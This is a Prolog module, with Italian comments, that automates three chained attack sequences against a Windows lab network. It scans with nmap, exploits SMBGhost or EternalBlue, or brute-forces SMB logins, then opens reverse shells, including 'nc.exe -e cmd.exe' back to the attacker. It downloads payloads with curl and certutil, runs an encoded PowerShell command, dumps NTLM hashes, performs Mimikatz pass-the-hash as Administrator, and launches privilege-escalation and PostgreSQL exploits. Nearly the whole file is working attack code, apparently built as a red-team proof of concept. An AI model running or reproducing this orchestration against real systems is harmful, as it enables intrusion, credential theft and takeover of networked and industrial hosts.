/** <poc> Implementazione di POC1, POC2, POC3
 *
 *  Questo modulo introduce diversi predicati di utilità 
 *  per l'implementazione della POC1.
 *  Fase 1
 *  - Creazione di un reverse listener sulla porta 80 sulla
 *	macchina dell'attaccante 10.1.146.120.
 *  - Creazione di un Web server sulla porta 5555.
 *  - Exploit SMBGhost su 10.1.146.111 e ottenimento di una
 *	reverse shell.
 *  Fase 2
 *  - Creazione della directory C:\Users\User\Desktop\postgres.
 *  - Scaricamento dell'archivio exploit_LPE_OPC.zip tramite
 *	curl (eseguito da 10.1.146.111). Il Web server che riceve
 *	la richiesta di curl è quello fatto partire in Fase 1.
 *  Fase 3
 *  - Ingresso nella directory C:\Users\User\Desktop\postgres.
 *  - Spacchettamento di exploit_LPE_OPC.zip tramite tar.exe.
 *  - Copia del file vcruntime140.dll in C:\Windows\System32\.
 *  - Esecuzione del comando seguente:
 *	exploit.exe 10.1.146.11 postgres PASSWORD 5432
 *
 *  @author Mauro Andreolini
 *  @version 0.1
 */
:- module(poc1, [
		run_poc1/4,
		run_poc2/4,
		run_poc3/4,
		run_poc/0
]).

:- use_module(scanner/nmap_scanner).
:- use_module(auxiliary/shell).
:- use_module(auxiliary/http_server).
:- use_module(auxiliary/smb_brute_password).
:- use_module(auxiliary/smb_shell).
:- use_module(exploits/smb_ghost).
:- use_module(exploits/eternalblue).
:- use_module(utils/command_runner).
:- use_module(utils/file_utils).

:- dynamic running_reverse_shell/3.

% Parametri dell'attaccante
attacker_username("kali").
attacker_password("kali").
attacker_ip("10.1.146.120").
reverse_listener_port("poc1", 80).
reverse_listener_port("poc2", 4444).
reverse_listener_port("poc3", 4444).
reverse_pipe_in("/tmp/in").
reverse_pipe_out("/tmp/out").
http_server_port("poc1", 5555).
http_server_port("poc2", 5555).
http_server_port("poc3", 5555).
http_server_directory("poc1", "/home/kali/working_directory/1.PostgreSQL/").
http_server_directory("poc2", "/home/kali/working_directory/").
http_server_directory("poc3", "/home/kali/working_directory/").

% Funzioni di appoggio (da spostare nei moduli)

% Estrae IP vulnerabile a SMBGhost in base alla porta SMB + check_vuln/2
find_host_vulnerable_smbghost(Hosts, TCPServices, VulnIP) :-
	member((_Hostname, VulnIP), Hosts),
	member((VulnIP, "tcp", Port, "microsoft-ds", _), TCPServices),
	smb_ghost:check_vuln_smb_ghost(VulnIP, Port), !.

% Estrae IP vulnerabile a EternalBlue in base alla porta SMB + check_vuln/2
find_host_vulnerable_eternalblue(Hosts, TCPServices, VulnIP) :-
	member((_Hostname, VulnIP), Hosts),
	member((VulnIP, "tcp", Port, "microsoft-ds", _), TCPServices),
	eternalblue:check_vuln_eternalblue(VulnIP, Port), !.

% Estrae IP con PostgreSQL
find_postgresql_host(Hosts, TCPServices, PostgreSQLIP, PostgreSQLPort) :-
	member((_Hostname, PostgreSQLIP), Hosts),
	member((PostgreSQLIP, "tcp", PostgreSQLPort, "postgresql", _), TCPServices), !.

%%% INTEGRA TUTTO IN utils/shell.pl %%%
write_command(Command, CleanedLines) :-
	write_command(Command, CleanedLines, []).

write_command(Command, CleanedLines, Options) :-
	option(timeout_silence(TimeoutSilence), Options, 0.5),
	option(timeout_max(TimeoutMax), Options, 10),
	option(filter(DoFilter), Options, false),

	open('/tmp/in', write, InStream),
	format(InStream, '~w~n', [Command]),
	flush_output(InStream),
	close(InStream),

	open('/tmp/out', read, OutStream, [type(text), buffer(line)]),
	read_output_lines_silence(OutStream, TimeoutSilence, TimeoutMax, RawLines),
	close(OutStream),

	strip_prompt_echo(RawLines, CleanLines1),
	( DoFilter == true ->
		exclude(is_useless_line, CleanLines1, FilteredLines)
	;   FilteredLines = CleanLines1
	),

	maplist(clean_string_line, FilteredLines, Cleaned),
	exclude(==( ""), Cleaned, CleanedLines).

read_output_lines_silence(Stream, SilenceTimeout, MaxTimeout, Lines) :-
	get_time(Start),
	read_output_lines_silence_loop(Stream, SilenceTimeout, MaxTimeout, Start, [], RevLines),
	reverse(RevLines, Lines).

read_output_lines_silence_loop(Stream, SilenceTimeout, MaxTimeout, Start, Acc, Lines) :-
	get_time(Now),
	Elapsed is Now - Start,
	( Elapsed >= MaxTimeout ->
		Lines = Acc
	;   wait_for_input([Stream], Ready, SilenceTimeout),
		( Ready == [] ->
			Lines = Acc  % silenzio: nessun input per SilenceTimeout
		;   read_available_line(Stream, SilenceTimeout, Line),
			( Line \= "" ->
				read_output_lines_silence_loop(Stream, SilenceTimeout, MaxTimeout, Start, [Line|Acc], Lines)
			;   read_output_lines_silence_loop(Stream, SilenceTimeout, MaxTimeout, Start, Acc, Lines)
			)
		)
	).

read_available_line(Stream, Timeout, Line) :-
	read_chars_loop(Stream, Timeout, [], RevChars),
	reverse(RevChars, Chars),
	string_chars(Line, Chars).

read_chars_loop(Stream, Timeout, Acc, Line) :-
	(   wait_for_input([Stream], Ready, Timeout),
		Ready \= []
	->  get_char(Stream, Char),
		(   Char == '\n'
		->  Line = Acc
		;   read_chars_loop(Stream, Timeout, [Char|Acc], Line)
		)
	;   Line = Acc
	).

write_command_string(Command, String) :-
	write_command(Command, Lines),
	atomic_list_concat(Lines, '\n', String).

strip_prompt_echo([First, Second | Rest], Cleaned) :-
	starts_with_prompt(First),
	contains_command(Second),
	!,
	Cleaned = Rest.
strip_prompt_echo(L, L).

contains_command(Line) :-
	sub_string(Line, _, _, _, ">"),
	sub_string(Line, _, _, _, "\\").

clean_string_line(Line, Cleaned) :-
	split_string(Line, "\n\r", "\n\r ", Pieces),
	exclude(==( ""), Pieces, NonEmpty),
	atomic_list_concat(NonEmpty, '', Cleaned).

% Filtra righe superflue
is_useless_line(Line) :-
	Line = "";
	sub_string(Line, _, _, _, "Microsoft Windows");
	sub_string(Line, _, _, _, "Corporation").

starts_with_prompt(Line) :-
	sub_string(Line, 0, _, _, "C:\\").

%clean_string(Raw, Cleaned) :-
%	split_string(Raw, "\n\r", "\n\r", Pieces),		% divide su newline e carriage return
%	exclude(==( ""), Pieces, NonEmpty),			% rimuove stringhe vuote
%	exclude(starts_with_prompt, NonEmpty, Filtered),	% rimuove prompt tipo C:\...
%	atomic_list_concat(Filtered, '\n', Cleaned).

%% Esegue un comando e ritorna l'output utile come stringa
%write_command(Command, CleanResponse) :-
%	% 1. Scrive il comando
%	open('/tmp/in', write, InStream),
%	format(InStream, '~w~n', [Command]),
%	flush_output(InStream),
%	close(InStream),
%
%	% 2. Legge l’output riga per riga (non bloccante)
%	open('/tmp/out', read, OutStream, [type(text), buffer(line)]),
%	read_output_lines(OutStream, 5.0, RawLines),
%	close(OutStream),
%
%	% 3. Filtra righe non informative
%	exclude(is_useless_line, RawLines, UsefulLines),
%
%	% 4. Concatena il risultato utile
%	atomic_list_concat(UsefulLines, '\n', CleanResponse).
%
%% Drena /tmp/out dopo aver stabilito una reverse shell (svuota prompt iniziale)
%drain_shell_output :-
%	open('/tmp/out', read, OutStream, [type(text), buffer(line)]),
%	read_output_lines(OutStream, 5.0, _),
%	close(OutStream).
%
%% Lettura non bloccante riga per riga (anche senza newline)
%read_output_lines(Stream, Timeout, Lines) :-
%	read_output_lines_loop(Stream, Timeout, [], RevLines),
%	reverse(RevLines, Lines).
%
%read_output_lines_loop(Stream, Timeout, Acc, Lines) :-
%	read_available_line(Stream, Timeout, Line),
%	( Line \= ""
%	-> read_output_lines_loop(Stream, Timeout, [Line|Acc], Lines)
%	;  Lines = Acc
%	).
%
%% Lettura non bloccante di una "riga" (termina a newline o timeout)
%read_available_line(Stream, Timeout, Line) :-
%	read_chars_loop(Stream, Timeout, [], RevChars),
%	reverse(RevChars, Chars),
%	string_chars(Line, Chars).
%
%read_chars_loop(Stream, Timeout, Acc, Line) :-
%	(   wait_for_input([Stream], Ready, Timeout),
%		Ready \= []
%	->  get_char(Stream, Char),
%		(   Char == '\n'
%		->  Line = Acc
%		;   read_chars_loop(Stream, Timeout, [Char|Acc], Line)
%		)
%	;   Line = Acc  % timeout: ritorna quello che c'è
%	).
%
%% Filtra righe superflue
%is_useless_line(Line) :-
%	Line = "";
%	sub_string(Line, _, _, _, "Microsoft Windows");
%	sub_string(Line, _, _, _, "Corporation").
%
%starts_with_prompt(Line) :-
%	sub_string(Line, 0, _, _, "C:\\").
%
%clean_string(Raw, Cleaned) :-
%	split_string(Raw, "\n\r", "\n\r", Pieces),		% divide su newline e carriage return
%	exclude(==( ""), Pieces, NonEmpty),			% rimuove stringhe vuote
%	exclude(starts_with_prompt, NonEmpty, Filtered),	% rimuove prompt tipo C:\...
%	atomic_list_concat(Filtered, '\n', Cleaned).

% Termina i servizi avviati
cleanup_poc1 :-
	reverse_listener_port("poc1", ListenerPort),
	http_server_port("poc1", HttpPort),
	stop_reverse_listener(ListenerPort),
	stop_http_server(HttpPort).

cleanup_poc2 :-
	reverse_listener_port("poc2", ListenerPort),
	http_server_port("poc2", HttpPort),
	stop_reverse_listener(ListenerPort),
	stop_http_server(HttpPort).

cleanup_poc3 :-
	reverse_listener_port("poc3", ListenerPort),
	http_server_port("poc3", HttpPort),
	stop_reverse_listener(ListenerPort),
	stop_http_server(HttpPort).

scan_hosts(Target, Hosts, TCPServices, KernelGuesses) :-
	attacker_username(Username),
	attacker_password(Password),
	scan_target(Target, XMLText, Username, Password),
	%read_file_to_string("test/full-scan.xml", XMLText, []),
	parse_nmap_xml(XMLText, Hosts, TCPServices, KernelGuesses).

detect_poc(Hosts, TCPServices, KernelGuesses, POC) :-
        % Check if any host is vulnerable to SMBGhost
        (   (   member((_, IP), Hosts), 
                member((IP, _, Port, "microsoft-ds", _), TCPServices),
                smb_ghost:check_vuln_smb_ghost(IP, Port)
            ) ->
                POC = "poc1"  % If any host is vulnerable to SMBGhost, return "poc1"
        ;   % Otherwise, check for EternalBlue
            (   member((_, IP), Hosts), 
                member((IP, _, Port, "microsoft-ds", _), TCPServices),
                eternalblue:check_vuln_eternalblue(IP, Port)
            ) -> 
                POC = "poc2"  % If any host is vulnerable to EternalBlue, return "poc2"
	;   % Otherwise, no vulnerability found, return "poc3"
		POC = "poc3"
        ).

% Fase 0: scansione della rete, parsing e identificazione
% macchina vulnerabile
fase0(Target, Hosts, TCPServices, KernelGuesses, POC) :-
	format("Scansione della rete in corso...~n", []),
	flush_output,
	scan_hosts(Target, Hosts, TCPServices, KernelGuesses),
	format("Scansione completata.~n", []),
	flush_output,
	detect_poc(Hosts, TCPServices, KernelGuesses, POC),
	format("Rilevati servizi vulnerabili.~n", []),
	flush_output.


% Fase 1 POC1:
% - avvio reverse listener su tcp/80
% - avvio web server su tcp/5555
% - esecuzione exploit SMBGhost su 10.1.146.111
fase1_poc1(VulnHost) :-
	flush_output,
	reverse_listener_port("poc1", ListenerPort),
	reverse_pipe_in(ReverseIn),
	reverse_pipe_out(ReverseOut),
	http_server_port("poc1", HttpPort),
	http_server_directory("poc1", HttpDirectory),
	start_reverse_listener(ListenerPort, ReverseIn, ReverseOut),
	format("Esecuzione di un server TCP per la ricezione di una reverse shell.~n", []),
	flush_output,
	smb_ghost:exploit_smb_ghost(VulnHost, 445),
	format("Ottenimento di una reverse shell tramite SMBGhost su ~w.~n", [VulnHost]),
	flush_output,
	start_http_server(HttpPort, HttpDirectory),
	format("Esecuzione di un Web server per il trasferimento remoto di file.~n", []),
	flush_output.

% Fase 2 POC1:
% - creazione directory C:\Users\User\Desktop\postgres
%   su 10.1.146.111
% - scaricamento archivio exploit_LPE_OPC.zip su 10.1.146.111
%   tramite comando curl.exe
fase2_poc1(AttackerIP, VulnHost) :-
	write_command("mkdir \"C:\\Users\\User\\Desktop\\postgres\"", _),
	string_concat("curl http://", AttackerIP, Part1),
	string_concat(Part1, ":5555/exploit_LPE_OPC.zip -o \"C:\\Users\\User\\Desktop\\postgres\\exploit_LPE_OPC.zip\"", CurlCommand),
	write_command(CurlCommand, _),
	format("Scaricamento del file exploit_LPE_OPC.zip su ~w.~n", [VulnHost]),
	flush_output.

% Fase 3 POC1:
% - ingresso nella directory C:\Users\User\Desktop\postgres
%   su 10.1.146.111
% - spacchettamento archivio LPE_OPC.zip su 10.1.146.111
%   tramite comando tar.exe
% - copia del file vcruntime140.dll in C:\Windows\System32
%   su 10.1.146.111
%   Esecuzione comando exploit.exe su 10.1.146.111
fase3_poc1(VulnHost, PostgreSQLHost, PostgreSQLPort) :-
	write_command("cd \"C:\\Users\\User\\Desktop\\postgres\"", _),
	write_command("tar.exe -xf exploit_LPE_OPC.zip", _),
	format("Spacchettamento del file exploit_LPE_OPC.zip su ~w.~n", [VulnHost]),
	flush_output,
	sleep(5),
	write_command("copy vcruntime140.dll C:\\Windows\\System32\\", _),
	format("Copia del file vcruntime140.dll su C:\\Windows\\System32.~n", []),
	flush_output,
	string_concat("exploit.exe ", PostgreSQLHost, Part1),
	string_concat(Part1, " postgres PASSWORD ", Part2),
	string_concat(Part2, PostgreSQLPort, PostgresCommand),
	write_command(PostgresCommand, _),
	format("Esecuzione del file exploit.exe su ~w.~n", [VulnHost]),
	flush_output.

% Fase 1 POC2:
% - avvio reverse listener su tcp/4444
% - esecuzione exploit EternalBlue su 10.1.146.112
%   tramite script Metasploit eternalblue.rc
fase1_poc2(VulnHost) :-
	format("Target identificato: ~w.~n", [VulnHost]),
	flush_output,
	reverse_listener_port("poc2", ListenerPort),
	reverse_pipe_in(ReverseIn),
	reverse_pipe_out(ReverseOut),
	http_server_port("poc2", HttpPort),
	http_server_directory("poc2", HttpDirectory),
	start_reverse_listener(ListenerPort, ReverseIn, ReverseOut),
	!,
	format("Esecuzione di un server TCP per la ricezione di una reverse shell.~n", []),
	flush_output,
	eternalblue:exploit_eternalblue(VulnHost, 445),
	format("Ottenimento di una reverse shell tramite EternalBlue su ~w.~n", [VulnHost]),
	flush_output,
	start_http_server(HttpPort, HttpDirectory),
	format("Esecuzione di un Web server per il trasferimento remoto di file.~n", []),
	flush_output.

% Fase 2 POC2:
% - avvio web server su tcp/5555
% - creazione directory C:\Users\User\Desktop\payload
%   su 10.1.146.112
% - scaricamento file seguenti su 10.1.146.112
%   tramite comando curl.exe:
%   - eric.ps1, payload.ps1, 7z.dll, 7z.exe, payload.bat,
%     OpenOPC.zip, PsExec.exe, eternalpayload.exe
fase2_poc2(AttackerIP, VulnHost) :-
	http_server_port("poc2", HttpPort),
	write_command("mkdir \"C:\\Users\\User\\Desktop\\payload\"", _),
	string_concat("curl --output C:\\Users\\User\\Desktop\\payload\\eric.ps1 http://", AttackerIP, File1Part1),
	string_concat(File1Part1, ":", File1Part2),
	string_concat(File1Part2, HttpPort, File1Part3),
	string_concat(File1Part3, "/tools/eric.ps1", CurlCommandFile1),
	write_command(CurlCommandFile1, _Output1),
	format("Scaricamento del file eric.ps1 su ~w.~n", [VulnHost]),
	flush_output,
	string_concat("curl --output C:\\Users\\User\\Desktop\\payload\\payload.ps1 http://", AttackerIP, File2Part1),
	string_concat(File2Part1, ":", File2Part2),
	string_concat(File2Part2, HttpPort, File2Part3),
	string_concat(File2Part3, "/tools/payload.ps1", CurlCommandFile2),
	write_command(CurlCommandFile2, _Output2),
	format("Scaricamento del file payload.ps1 su ~w.~n", [VulnHost]),
	flush_output,
	string_concat("curl --output C:\\Users\\User\\Desktop\\payload\\7z.dll http://", AttackerIP, File3Part1),
	string_concat(File3Part1, ":", File3Part2),
	string_concat(File3Part2, HttpPort, File3Part3),
	string_concat(File3Part3, "/tools/7z.dll", CurlCommandFile3),
	write_command(CurlCommandFile3, _Output3),
	format("Scaricamento del file 7z.dll su ~w.~n", [VulnHost]),
	flush_output,
	string_concat("curl --output C:\\Users\\User\\Desktop\\payload\\7z.exe http://", AttackerIP, File4Part1),
	string_concat(File4Part1, ":", File4Part2),
	string_concat(File4Part2, HttpPort, File4Part3),
	string_concat(File4Part3, "/tools/7z.exe", CurlCommandFile4),
	write_command(CurlCommandFile4, _Output4),
	format("Scaricamento del file 7z.exe su ~w.~n", [VulnHost]),
	flush_output,
	string_concat("curl --output C:\\Users\\User\\Desktop\\payload\\payload.bat http://", AttackerIP, File5Part1),
	string_concat(File5Part1, ":", File5Part2),
	string_concat(File5Part2, HttpPort, File5Part3),
	string_concat(File5Part3, "/tools/payload.bat", CurlCommandFile5),
	write_command(CurlCommandFile5, _Output5),
	format("Scaricamento del file payload.bat su ~w.~n", [VulnHost]),
	flush_output,
	string_concat("curl --output C:\\Users\\User\\Desktop\\payload\\OpenOPC.zip http://", AttackerIP, File6Part1),
	string_concat(File6Part1, ":", File6Part2),
	string_concat(File6Part2, HttpPort, File6Part3),
	string_concat(File6Part3, "/tools/OpenOPC.zip", CurlCommandFile6),
	write_command(CurlCommandFile6, _Output6),
	format("Scaricamento del file OpenOPC.zip su ~w.~n", [VulnHost]),
	flush_output,
	string_concat("curl --output C:\\Users\\User\\Desktop\\payload\\PsExec.exe http://", AttackerIP, File7Part1),
	string_concat(File7Part1, ":", File7Part2),
	string_concat(File7Part2, HttpPort, File7Part3),
	string_concat(File7Part3, "/tools/PsExec.exe", CurlCommandFile7),
	write_command(CurlCommandFile7, _Output7),
	format("Scaricamento del file PsExec.exe su ~w.~n", [VulnHost]),
	flush_output,
	string_concat("curl --output C:\\Users\\User\\Desktop\\payload\\eternalpayload.exe http://", AttackerIP, File8Part1),
	string_concat(File8Part1, ":", File8Part2),
	string_concat(File8Part2, HttpPort, File8Part3),
	string_concat(File8Part3, "/tools/eternalpayload.exe", CurlCommandFile8),
	write_command(CurlCommandFile8, _Output8),
	format("scaricamento del file eternalpayload.exe su ~w.~n", [vulnhost]),
	flush_output.

% Fase 3 POC2:
% - ingresso nella directory C:\Users\User\Desktop\payload
%   su 10.1.146.112
% - esecuzione script payload.ps1 su 10.1.146.112
%   tramite comando powershell.exe
% - attesa di 10 secondi
% - lettura del file C:\Users\User\Desktop\payload\hash.txt
%   su 10.1.146.112 tramite comando type
fase3_poc2(AttackerIP, VulnHost, NTLMHash) :-
	write_command("cd \"C:\\Users\\User\\Desktop\\payload\"", _Output1),
	write_command(
		"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAQgB5AHAAYQBzAHMAIAAtAEYAaQBsAGUAIABDADoAXABcAFUAcwBlAHIAcwBcAFUAcwBlAHIAXABEAGUAcwBrAHQAbwBwAFwAcABhAHkAbABvAGEAZABcAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACAALQBWAGUAcgBiACAAUgB1AG4AQQBzAA==",
	       	OutputMimi,
	       	[ timeout_silence(5.0), timeout_max(10), filter(false)]
	),
	sleep(5),
	format("Esecuzione del file payload.ps1 come amministratore su ~w.~n", [VulnHost]),
	flush_output,
	write_command("type C:\\Users\\User\\Desktop\\payload\\hash.txt", [ _ , NTLMHash | _ ]),
	format("Lettura del file hash.txt su ~w.~n", [VulnHost]),
	flush_output,
	format("Hash = ~w.~n", [NTLMHash]),
	flush_output.

% Fase 4 POC2:
% - creazione di uno script pth.ps1 per l'esecuzione di
%   eternalpayload.exe come Administrator tramite Mimikatz
% - ingresso nella directory C:\Users\User\Desktop\payload
%   su 10.1.146.112
% - scaricamento file pth.ps1 su 10.1.146.112
%   tramite comando curl.exe
%   Esecuzione script pth.ps1 su 10.1.146.112
%   tramite comando powershell.exe
fase4_poc2(AttackerIP, VulnHost, NTLMHash) :-
	ScriptPath = "/home/kali/working_directory/tools/pth.ps1",
	http_server_port("poc2", HttpPort),
	string_concat("Invoke-Mimidogz -Command '\"sekurlsa::pth /user:Administrator /domain:. /NTLM:", NTLMHash, Part1),
	string_concat(Part1, " /run:C:\\Users\\User\\Desktop\\Payload\\eternalpayload.exe\" exit'", MimidogzCommand),
	ScriptLines = [
		"Set-ExecutionPolicy Bypass -Scope Process -Force",
		"Import-Module .\\eric.ps1",
		"Start-Sleep -s 5",
		"Write-Output \"Module Imported\"",
		MimidogzCommand
	],
	write_lines(ScriptPath, ScriptLines),
	format("Creazione di uno script pth.ps1 per il pass-the-hash.~n", []),
	flush_output,
	write_command("cd \"C:\\Users\\User\\Desktop\\payload\"", _Output1),
	string_concat("curl http://", AttackerIP, CurlPart1),
	string_concat(CurlPart1, ":", CurlPart2),
	string_concat(CurlPart2, HttpPort, CurlPart3),
	string_concat(CurlPart3, "/tools/pth.ps1 -o \"C:\\Users\\User\\Desktop\\payload\\pth.ps1\"", CurlCommand),
	write_command(CurlCommand, _),
	format("Scaricamento del file pth.ps1 su ~w.~n", [VulnHost]),
	flush_output,
	write_command("powershell -ExecutionPolicy Bypass -File \"C:\\Users\\User\\Desktop\\payload\\pth.ps1\"", _),
	format("Esecuzione del file pth.ps1 su ~w.~n", [VulnHost]),
	flush_output.
	
% Fase 1 POC3:
% - brute force password utente User2 su 10.1.146.110
%   tramite psexec.py e dizionario passwords.txt 
% - avvio reverse listener su tcp/4444
% - avvio web server su tcp/5555
% - creazione directory C:\Users\User2\Desktop\payload
%   su 10.1.146.110
% - scaricamento file nc.exe su 10.1.146.110
%   tramite comando certutil.exe
% - esecuzione comando nc.exe -e cmd.exe 10.1.146.120 4444
%   su 10.1.146.110
fase1_poc3(AttackerIP, VulnHost, Password) :-
	format("Target identificato: ~w.~n", [VulnHost]),
	flush_output,
	Username = "User2",
	Dictionary = "/home/kali/working_directory/utils/passwords.txt",
	brute_force(Username, VulnHost, Dictionary, Password),
	format("Brute force password dell'utente User2 tramite SMB su ~w.~n", [VulnHost]),
	flush_output,
	format("Ottenimento di RCE tramite SMB su ~w.~n", [VulnHost]),
	flush_output,
	reverse_listener_port("poc3", ListenerPort),
	reverse_pipe_in(ReverseIn),
	reverse_pipe_out(ReverseOut),
	http_server_port("poc3", HttpPort),
	http_server_directory("poc3", HttpDirectory),
	start_http_server(HttpPort, HttpDirectory),
	format("Esecuzione di un Web server per il trasferimento remoto di file.~n", []),
	flush_output,
	start_reverse_listener(ListenerPort, ReverseIn, ReverseOut),
	format("Esecuzione di un server TCP per la ricezione di una reverse shell.~n", []),
	flush_output,
	string_concat("http://", AttackerIP, URLPart1),
	string_concat(URLPart1, ":", URLPart2),
	string_concat(URLPart2, HttpPort, URLPart3),
	string_concat(URLPart3, "/utils/nc.exe", NcURL),
	NcPath = "C:\\Users\\User2\\Desktop\\payload\\nc.exe",
	run_command_smb(
		"cmd",
	       	[ "/c", "mkdir", "C:\\Users\\User2\\Desktop\\payload" ],
		VulnHost,
		Username, Password,
		_, _, _),
	run_command_smb(
		"certutil",
		[ "-split", "-f", "-urlcache", NcURL, NcPath ],
		VulnHost,
		Username, Password,
		_, _, _),
	format("Scaricamento del file nc.exe su ~w.~n", [VulnHost]),
	flush_output,
	run_command_smb(
		"cmd",
		[ "/c", "start", "/B", "C:\\Users\\User2\\Desktop\\payload\\nc.exe", "-e", "cmd.exe",
	       	AttackerIP, ListenerPort ],
		VulnHost,
		Username, Password,
		_, _, _),
	format("Esecuzione del file nc.exe su ~w.~n", [VulnHost]),
	flush_output,
	format("Ottenimento di una reverse shell su ~w.~n", [VulnHost]),
	flush_output.

% Fase 2 POC3:
% - scaricamento file seguenti su 10.1.146.110
%   tramite comando certutil.exe:
%   - printnightmare.zip, payload.bat, pg_exploit.exe,
%     7z.dll, 7z.exe, OpenOPC.zip, pg_exec.dll
fase2_poc3(AttackerIP, VulnHost) :-
	http_server_port("poc3", HttpPort),
	string_concat("certutil -split -f -urlcache http://", AttackerIP, File1Part1),
	string_concat(File1Part1, ":", File1Part2),
	string_concat(File1Part2, HttpPort, File1Part3),
	string_concat(File1Part3, "/utils/printnightmare.zip C:\\Users\\User2\\Desktop\\payload\\printnightmare.zip", CertUtilCommand1),
	write_command(CertUtilCommand1, _Output1),
	format("Scaricamento del file printnightmare.ps1 su ~w.~n", [VulnHost]),
	flush_output,
	string_concat("certutil -split -f -urlcache http://", AttackerIP, File2Part1),
	string_concat(File2Part1, ":", File2Part2),
	string_concat(File2Part2, HttpPort, File2Part3),
	string_concat(File2Part3, "/utils/payload.bat C:\\Users\\User2\\Desktop\\payload\\payload.bat", CertUtilCommand2),
	write_command(CertUtilCommand2, _Output2),
	format("Scaricamento del file payload.bat su ~w.~n", [VulnHost]),
	flush_output,
	string_concat("certutil -split -f -urlcache http://", AttackerIP, File3Part1),
	string_concat(File3Part1, ":", File3Part2),
	string_concat(File3Part2, HttpPort, File3Part3),
	string_concat(File3Part3, "/utils/pg_exploit.exe C:\\Users\\User2\\Desktop\\payload\\pg_exploit.exe", CertUtilCommand3),
	write_command(CertUtilCommand3, _Output3),
	format("Scaricamento del file pg_exploit.exe su ~w.~n", [VulnHost]),
	flush_output,
	string_concat("certutil -split -f -urlcache http://", AttackerIP, File4Part1),
	string_concat(File4Part1, ":", File4Part2),
	string_concat(File4Part2, HttpPort, File4Part4),
	string_concat(File4Part4, "/utils/7z.dll C:\\Users\\User2\\Desktop\\payload\\7z.dll", CertUtilCommand4),
	write_command(CertUtilCommand4, _Output4),
	format("Scaricamento del file 7z.dll su ~w.~n", [VulnHost]),
	flush_output,
	string_concat("certutil -split -f -urlcache http://", AttackerIP, File5Part1),
	string_concat(File5Part1, ":", File5Part2),
	string_concat(File5Part2, HttpPort, File5Part5),
	string_concat(File5Part5, "/utils/7z.exe C:\\Users\\User2\\Desktop\\payload\\7z.exe", CertUtilCommand5),
	write_command(CertUtilCommand5, _Output5),
	format("Scaricamento del file 7z.exe su ~w.~n", [VulnHost]),
	flush_output,
	string_concat("certutil -split -f -urlcache http://", AttackerIP, File6Part1),
	string_concat(File6Part1, ":", File6Part2),
	string_concat(File6Part2, HttpPort, File6Part6),
	string_concat(File6Part6, "/utils/OpenOPC.zip C:\\Users\\User2\\Desktop\\payload\\OpenOPC.zip", CertUtilCommand6),
	write_command(CertUtilCommand6, _Output6),
	format("Scaricamento del file OpenOPC.zip su ~w.~n", [VulnHost]),
	flush_output,
	string_concat("certutil -split -f -urlcache http://", AttackerIP, File7Part1),
	string_concat(File7Part1, ":", File7Part2),
	string_concat(File7Part2, HttpPort, File7Part7),
	string_concat(File7Part7, "/utils/pg_exec.dll C:\\Users\\User2\\Desktop\\payload\\pg_exec.dll", CertUtilCommand7),
	write_command(CertUtilCommand7, _Output7),
	format("Scaricamento del file pg_exec.dll su ~w.~n", [VulnHost]),
	flush_output.

% Fase 3 POC3:
% - ingresso nella directory C:\Users\User\Desktop\payload
%   su 10.1.146.110
% - Esecuzione comando pg_exploit.exe su 10.1.146.110
fase3_poc3(VulnHost, PostgreSQLHost) :-
	write_command("cd C:\\Users\\User2\\Desktop\\payload", _Output1),
	string_concat("pg_exploit.exe ", PostgreSQLHost, Part1),
	string_concat(Part1, " postgres PASSWORD 5432", PostgresCommand),
	writeln(PostgresCommand),
	write_command(PostgresCommand, _Output2),
	format("Esecuzione del file pg_exploit.exe su ~w.~n", [VulnHost]),
	flush_output.

% Esegui dinamicamente una POC
run_poc :-
	Target = "10.1.146.0/24",
	fase0(Target, Hosts, TCPServices, KernelGuesses, POC),
	( POC == "poc1" ->
	  run_poc1(Hosts, TCPServices, KernelGuesses, POC)
	; POC == "poc2" ->
	  run_poc2(Hosts, TCPServices, KernelGuesses, POC)
	; POC == "poc3" ->
	  run_poc3(Hosts, TCPServices, KernelGuesses, POC)
	).

% Esecuzione della POC1
run_poc1(Hosts, TCPServices, KernelGuesses, POC) :-
	attacker_ip(AttackerIP),
	find_host_vulnerable_smbghost(Hosts, TCPServices, VulnHost),
	flush_output,
	find_postgresql_host(Hosts, TCPServices, PostgreSQLHost, PostgreSQLPort),
	fase1_poc1(VulnHost),
	sleep(5),
	fase2_poc1(AttackerIP, VulnHost),
	sleep(5),
	fase3_poc1(VulnHost, PostgreSQLHost, PostgreSQLPort),
	sleep(35),
	cleanup_poc1,
	format("SEQUENZA ESEGUITA CON SUCCESSO.~n", []),
	true.

% Esecuzione della POC2
run_poc2(Hosts, TCPServices, KernelGuesses, POC) :-
	attacker_ip(AttackerIP),
	find_host_vulnerable_eternalblue(Hosts, TCPServices, VulnHost),
	fase1_poc2(VulnHost),
	sleep(5),
	fase2_poc2(AttackerIP, VulnHost),
	sleep(5),
	fase3_poc2(AttackerIP, VulnHost, NTLMHash),
	sleep(5),
	fase4_poc2(AttackerIP, VulnHost, NTLMHash),
	sleep(35),
	cleanup_poc2,
	format("SEQUENZA ESEGUITA CON SUCCESSO.~n", []),
	true.

% Esecuzione della POC3
run_poc3(Hosts, TCPServices, KernelGuesses, POC) :-
	attacker_ip(AttackerIP),
	VulnHost = "10.1.146.110",
	PostgreSQLHost = "10.1.146.11",
	fase1_poc3(AttackerIP, VulnHost, Password),
	sleep(5),
	fase2_poc3(AttackerIP, VulnHost),
	sleep(5),
	fase3_poc3(VulnHost, PostgreSQLHost),
	sleep(35),
	cleanup_poc3,
	format("SEQUENZA ESEGUITA CON SUCCESSO.~n", []),
	true.
